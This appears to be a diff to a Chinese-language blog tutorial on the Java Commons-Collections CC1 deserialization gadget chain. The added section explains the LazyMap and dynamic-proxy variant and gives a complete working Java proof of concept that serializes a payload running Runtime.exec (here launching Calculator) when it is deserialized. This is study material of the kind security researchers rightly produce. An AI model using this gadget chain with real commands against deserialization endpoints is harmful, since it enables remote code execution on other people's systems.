@@ -1,6 +1,8 @@
 # CommonsCollections1链详解
 
 
+比较难一点的CC链
+&lt;!--more--&gt;
 # CommonsCollections1链详解
 jdk8源码下载
 https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4
@@ -142,6 +144,76 @@ public class CommonsCollection1 {
 ![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142108071.png)
 `map.put(&#34;value&#34;,&#34;value&#34;);`
 `key`放入`value`，正好能取出`Target`中的值，所以就绕过了`if`条件
+
+## 另一条
+在上面选择任意类执行`transform`方法的时候，选择了`TransformedMap`
+这次选择另一个类`LazyMap`中的`get()`方法
+![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401151446822.png)
+再看一下哪里调用了`get()`方法，恰好在`AnnotationInocationHandler`类中的`inoke()`方法中调用了`get()`方法
+![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401151448743.png)
+而恰好`memberValues`也是可控的，那如何调用到`invoke()`方法呢？
+这里需要一个新的知识点，动态代理，将`AnnoationInvocationHandler`动态代理，执行任意方法，即可调用到`invoke`方法，但是根据 invoke 中的`if`条件，执行的任意方法必须是无参的，恰好在`AnnotationInvocationHandler`类中的`readObject()`方法中，有这样的方法存在
+![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/20240115145104.png)
+于是根据上面的`poc`修改一下
+```java
+package org.example.CommonsCollections;  
+  
+import org.apache.commons.collections.Transformer;  
+import org.apache.commons.collections.functors.ChainedTransformer;  
+import org.apache.commons.collections.functors.ConstantTransformer;  
+import org.apache.commons.collections.functors.InvokerTransformer;  
+import org.apache.commons.collections.map.LazyMap;  
+import org.apache.commons.collections.map.TransformedMap;  
+  
+import java.io.*;  
+import java.lang.annotation.Target;  
+import java.lang.reflect.Constructor;  
+import java.lang.reflect.InvocationHandler;  
+import java.lang.reflect.Proxy;  
+import java.util.HashMap;  
+import java.util.Map;  
+  
+public class CommonsCollections1 {  
+    public static void main(String[] args) throws Exception{  
+  
+        Transformer[] transformers = new Transformer[]{  
+                new ConstantTransformer(Runtime.class),  
+                new InvokerTransformer(&#34;getMethod&#34;,new Class[]{String.class,Class[].class},new Object[]{&#34;getRuntime&#34;,null}),  
+                new InvokerTransformer(&#34;invoke&#34;,new Class[]{Object.class,Object[].class},new Object[]{null,null}),  
+                new InvokerTransformer(&#34;exec&#34;,new Class[]{String.class},new Object[]{&#34;/System/Applications/Calculator.app/Contents/MacOS/Calculator&#34;})  
+        };  
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  
+  
+        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();  
+        Map&lt;Object,Object&gt; lazymap = LazyMap.decorate(map,chainedTransformer);  
+        Class c = Class.forName(&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;);  
+        Constructor AnnotationInvocationHandlerConstructor = c.getDeclaredConstructor(Class.class,Map.class);  
+        AnnotationInvocationHandlerConstructor.setAccessible(true);  
+        InvocationHandler h = (InvocationHandler) AnnotationInvocationHandlerConstructor.newInstance(Target.class,lazymap);  
+  
+        Map proxyMap = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),new Class[]{Map.class},h);  
+  
+        Object o = AnnotationInvocationHandlerConstructor.newInstance(Target.class,proxyMap);  
+  
+        serialize(o);  
+        unserialize(&#34;ser.bin&#34;);  
+  
+    }  
+  
+    public static void serialize(Object obj) throws Exception{  
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&#34;ser.bin&#34;));  
+        oos.writeObject(obj);  
+    }  
+  
+    public static Object unserialize(String filename) throws Exception{  
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));  
+        Object obj = ois.readObject();  
+        return obj;  
+  
+    }  
+}
+```
+![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401151459198.png)
 
 
 ---
